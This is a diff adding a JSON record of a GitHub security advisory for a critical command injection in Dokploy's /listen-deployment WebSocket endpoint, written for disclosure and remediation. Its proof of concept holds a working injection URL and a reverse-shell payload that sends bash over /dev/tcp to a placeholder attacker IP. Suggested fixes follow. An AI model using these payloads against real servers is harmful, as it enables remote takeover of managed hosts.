@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-r73h-qr3p-hf7f",
+  "repo": {
+    "cve_id": "CVE-2026-45629",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nAuthenticated OS command injection in the `/listen-deployment` WebSocket endpoint allows any organization member to execute arbitrary system commands on remote servers managed by Dokploy, leading to full server compromise.\r\n\r\n## Details\r\n\r\n**Affected file**: `apps/dokploy/server/wss/listen-deployment.ts`\r\n\r\nThe `/listen-deployment` WebSocket endpoint streams deployment logs via SSH `tail -f`. The `logPath` parameter is validated by `readValidDirectory()` (in `packages/server/src/wss/utils.ts`), which only checks that the resolved path starts with the configured `BASE_PATH` (`/etc/dokploy` in production):\r\n\r\n```typescript\r\nexport const readValidDirectory = (directory, serverId) => {\r\n    const { BASE_PATH } = paths(!!serverId);\r\n    const resolvedBase = path.resolve(BASE_PATH);\r\n    const resolvedDir = path.resolve(directory);\r\n    return (\r\n        resolvedDir === resolvedBase ||\r\n        resolvedDir.startsWith(resolvedBase + path.sep)\r\n    );\r\n};\r\n```\r\n\r\nSince `path.resolve()` treats shell metacharacters (such as `;`) as valid filename characters on Linux, the validation is bypassed. The parameter is then directly interpolated into a shell command string and executed via SSH (line 73-75):\r\n\r\n```typescript\r\nconst command = `\r\n    tail -n +1 -f ${logPath};\r\n`;\r\nsshClient!.exec(command, ...);\r\n```\r\n\r\nCrucially, this WebSocket endpoint does not go through the tRPC permission middleware chain. Its hand-written authorization only checks:\r\n\r\n1. The user is authenticated (via `validateRequest`)\r\n2. The server belongs to the user's organization\r\n3. The server has an SSH key configured\r\n\r\nIt does **not** check `accessedServices`, `accessedServers`, or call `checkServicePermissionAndAccess()`, meaning any organization member (the default role upon registration) can target any server in the organization.\r\n\r\n## Proof of Concept\r\n\r\n**Prerequisites**:\r\n\r\n1. Register a user account on the target Dokploy instance\r\n2. Create an organization\r\n3. Have at least one server configured with an SSH key in the organization\r\n\r\n**Steps to reproduce**:\r\n\r\n1. Connect to the WebSocket endpoint with a crafted `logPath` parameter that includes shell metacharacters:\r\n\r\n```\r\nws://<dokploy_host>/listen-deployment?logPath=/etc/dokploy/apps;id;%23&serverId=<server_id>\r\n```\r\n\r\n(Include the session cookie or `x-api-key` header for authentication.)\r\n\r\n2. The `id` command will be executed on the remote server through SSH, and the output will be returned via the WebSocket connection.\r\n\r\n**Example - reverse shell**:\r\n\r\n```\r\nws://<dokploy_host>/listen-deployment?logPath=/etc/dokploy/apps;bash+-c+'exec+bash+-i+%26>/dev/tcp/<attacker_ip>/4444+0>%261';%23&serverId=<server_id>\r\n```\r\n\r\n**How the shell interprets the command**:\r\n\r\n```bash\r\ntail -n +1 -f /etc/dokploy/apps    # fails (file does not exist)\r\nid                                  # injected command executes successfully\r\n#;                                  # comment, ignored\r\n```\r\n\r\n## Impact\r\n\r\n- **Type**: OS Command Injection (CWE-78)\r\n- **Severity**: Critical (CVSS 9.9)\r\n- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L`\r\n- **Authentication**: Required, but any registered user (default \"member\" role) can exploit this\r\n- **Consequence**: Remote code execution with the privileges of the SSH user on all managed servers that have SSH keys configured\r\n\r\n## Recommended Fix\r\n\r\n**Option A (recommended)**: Add strict regex validation for `logPath` before `readValidDirectory()`, rejecting shell metacharacters:\r\n\r\n```typescript\r\nif (!/^[a-zA-Z0-9_\\-\\/\\. ]{0,500}$/.test(logPath)) {\r\n    ws.close(4000, \"Invalid log path format\");\r\n    return;\r\n}\r\n```\r\n\r\n**Option B**: Base64-encode the path value to avoid shell interpretation:\r\n\r\n```typescript\r\nconst encodedPath = Buffer.from(logPath).toString('base64');\r\nconst command = `tail -n +1 -f $(echo \"${encodedPath}\" | base64 -d);`;\r\n```\r\n\r\n**Option C**: Use SFTP streaming to read the file instead of shell `tail` + `exec`.",
+    "ghsa_id": "GHSA-r73h-qr3p-hf7f",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-r73h-qr3p-hf7f",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r73h-qr3p-hf7f"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45629"
+      }
+    ],
+    "published_at": "2026-05-11T18:37:17Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in /listen-deployment WebSocket Endpoint",
+    "updated_at": "2026-05-13T04:33:17Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "≤ v0.28.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
